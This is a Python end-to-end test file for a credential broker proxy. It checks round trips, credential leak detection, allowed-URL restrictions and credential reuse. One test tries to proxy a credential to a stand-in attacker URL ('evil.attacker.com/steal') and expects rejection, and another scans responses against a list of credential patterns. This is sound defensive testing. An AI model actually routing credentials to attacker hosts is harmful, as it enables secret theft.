"""
DAG nodes for credential proxy testing via broker:
proxy.broker_round_trip, proxy.no_credential_leak.
"""

import json

from tests.e2e.dag_runner import DagNode
from tests.e2e.helpers import broker_request


# ---------------------------------------------------------------------------
# proxy.broker_round_trip
# ---------------------------------------------------------------------------

def proxy_broker_round_trip(ctx: dict) -> dict:
    """
    Full proxy round-trip through the broker: send request, verify upstream
    response is returned, verify no credential material in response.

    Consumes: broker_url, broker_pem_key_path, credential_name, base_url
    """
    broker_url = ctx["broker_url"]
    pem_key_path = ctx["broker_pem_key_path"]
    credential_name = ctx["credential_name"]
    base_url = ctx.get("base_url", "http://localhost:3140")

    upstream_url = ctx.get("proxy_upstream_url", f"{base_url}/health")

    proxy_body = json.dumps({
        "method": "GET",
        "url": upstream_url,
        "credential": credential_name,
        "headers": {"Accept": "application/json"},
    })

    status, _, body = broker_request(
        broker_url, pem_key_path, "POST", "/proxy", body=proxy_body,
    )

    assert status == 200, (
        f"Proxy round-trip failed with {status}: {body}"
    )

    data = json.loads(body)
    result = data.get("data", data)

    # Verify upstream response was returned
    assert result.get("status_code") is not None, (
        f"No status_code in proxy response: {result}"
    )

    ctx["proxy_round_trip_response"] = result
    return ctx


PROXY_BROKER_ROUND_TRIP_NODE = DagNode(
    name="proxy.broker_round_trip",
    fn=proxy_broker_round_trip,
    depends_on=["proxy.via_broker"],
    produces=["proxy_round_trip_response"],
    consumes=["broker_url", "broker_pem_key_path", "credential_name"],
    critical=False,
    timeout=30.0,
)


# ---------------------------------------------------------------------------
# proxy.no_credential_leak
# ---------------------------------------------------------------------------

def proxy_no_credential_leak(ctx: dict) -> dict:
    """
    Verify that proxy responses never contain credential material.

    Consumes: proxy_round_trip_response
    """
    response = ctx.get("proxy_round_trip_response", {})
    response_str = json.dumps(response).lower()

    forbidden = [
        "access_token",
        "refresh_token",
        "client_secret",
        "private_key",
        "-----begin",
        "e2e-test-secret",
    ]

    for pattern in forbidden:
        assert pattern not in response_str, (
            f"Credential pattern '{pattern}' found in proxy response"
        )

    return ctx


PROXY_NO_CREDENTIAL_LEAK_NODE = DagNode(
    name="proxy.no_credential_leak",
    fn=proxy_no_credential_leak,
    depends_on=["proxy.broker_round_trip"],
    produces=[],
    consumes=[],
    critical=True,
    timeout=5.0,
)



# ---------------------------------------------------------------------------
# proxy.url_validation
# ---------------------------------------------------------------------------

def proxy_url_validation(ctx: dict) -> dict:
    """
    Create a credential with allowed_url_pattern restriction, then proxy to
    a URL that doesn't match → verify rejected.

    Consumes: broker_url, broker_pem_key_path, base_url,
              admin_session_cookie, csrf_token, ws_db_id
    """
    import os

    broker_url = ctx["broker_url"]
    pem_key_path = ctx["broker_pem_key_path"]
    base_url = ctx["base_url"]
    admin_cookie = ctx["admin_session_cookie"]
    csrf_token = ctx["csrf_token"]
    workspace_uuid = ctx.get("ws_db_id")

    if not workspace_uuid:
        return ctx

    # Create a credential with restricted URL pattern
    name = f"e2e-url-restrict-{os.urandom(4).hex()}"
    create_body = json.dumps({
        "name": name,
        "service": "e2e-url-restrict",
        "secret_value": "url-restrict-secret",
        "allowed_url_pattern": "https://allowed.example.com/*",
    })

    from tests.e2e.helpers import server_request as sr
    status, _, body = sr(
        base_url, "POST", "/api/v1/credentials",
        body=create_body,
        headers={"X-CSRF-Token": csrf_token},
        cookies=admin_cookie,
    )

    assert status in (200, 201), f"Create restricted cred failed: {status}: {body}"

    data = json.loads(body)
    cred_id = data.get("data", data).get("id")

    # Grant permission to workspace
    grant_body = json.dumps({
        "workspace_id": workspace_uuid,
        "permission": "vend_credential",
    })
    sr(
        base_url, "POST", f"/api/v1/credentials/{cred_id}/permissions",
        body=grant_body,
        headers={"X-CSRF-Token": csrf_token},
        cookies=admin_cookie,
    )

    # Verify the credential has the URL pattern stored
    from tests.e2e.helpers import server_request as sr2
    status, _, body = sr2(
        base_url, "GET", f"/api/v1/credentials/{cred_id}",
        cookies=admin_cookie,
    )
    assert status == 200
    cred_data = json.loads(body).get("data", {})
    stored_pattern = cred_data.get("allowed_url_pattern")
    assert stored_pattern == "https://allowed.example.com/*", (
        f"URL pattern not stored correctly: {stored_pattern}"
    )

    # Try to proxy to a URL that doesn't match the allowed pattern
    # Pattern is "https://allowed.example.com/*" — use a completely different domain
    proxy_body = json.dumps({
        "method": "GET",
        "url": "https://evil.attacker.com/steal",
        "credential": name,
    })

    status, _, body = broker_request(
        broker_url, pem_key_path, "POST", "/proxy", body=proxy_body,
    )

    # Should be rejected — either:
    # - 403 (server returned URL mismatch directly)
    # - 502 (broker wrapping server-side 403 as upstream failure)
    # - 400 (bad request)
    # The key test: it must NOT return 200 (success)
    assert status != 200, (
        f"URL mismatch proxy should not succeed, got 200: {body}"
    )

    # If we got 403/400, the URL pattern check blocked it at the right layer
    # If we got 502, the broker wrapped the server's rejection
    # Both are acceptable — the request was blocked
    assert status in (400, 403, 502), (
        f"Unexpected status for URL mismatch: {status}: {body}"
    )

    # Cleanup
    sr(
        base_url, "DELETE", f"/api/v1/credentials/{cred_id}",
        headers={"X-CSRF-Token": csrf_token},
        cookies=admin_cookie,
    )

    return ctx


PROXY_URL_VALIDATION_NODE = DagNode(
    name="proxy.url_validation",
    fn=proxy_url_validation,
    depends_on=["proxy.via_broker"],
    produces=[],
    consumes=["broker_url", "broker_pem_key_path", "base_url",
              "admin_session_cookie", "csrf_token"],
    critical=False,
    timeout=30.0,
)


# ---------------------------------------------------------------------------
# proxy.reuse_flow
# ---------------------------------------------------------------------------

def proxy_reuse_flow(ctx: dict) -> dict:
    """
    Two consecutive proxy calls with the same credential → both succeed.

    Consumes: broker_url, broker_pem_key_path, credential_name, base_url
    """
    broker_url = ctx["broker_url"]
    pem_key_path = ctx["broker_pem_key_path"]
    credential_name = ctx["credential_name"]
    base_url = ctx.get("base_url", "http://localhost:3140")
    upstream_url = ctx.get("proxy_upstream_url", f"{base_url}/health")

    for i in range(2):
        proxy_body = json.dumps({
            "method": "GET",
            "url": upstream_url,
            "credential": credential_name,
            "headers": {"Accept": "application/json"},
        })

        status, _, body = broker_request(
            broker_url, pem_key_path, "POST", "/proxy", body=proxy_body,
        )

        assert status == 200, (
            f"Proxy reuse call #{i+1} failed with {status}: {body}"
        )

    return ctx


PROXY_REUSE_FLOW_NODE = DagNode(
    name="proxy.reuse_flow",
    fn=proxy_reuse_flow,
    depends_on=["proxy.via_broker"],
    produces=[],
    consumes=["broker_url", "broker_pem_key_path", "credential_name"],
    critical=False,
    timeout=30.0,
)



def get_nodes():
    """Return all proxy DAG nodes."""
    return [
        PROXY_BROKER_ROUND_TRIP_NODE,
        PROXY_NO_CREDENTIAL_LEAK_NODE,
        PROXY_URL_VALIDATION_NODE,
        PROXY_REUSE_FLOW_NODE,
    ]
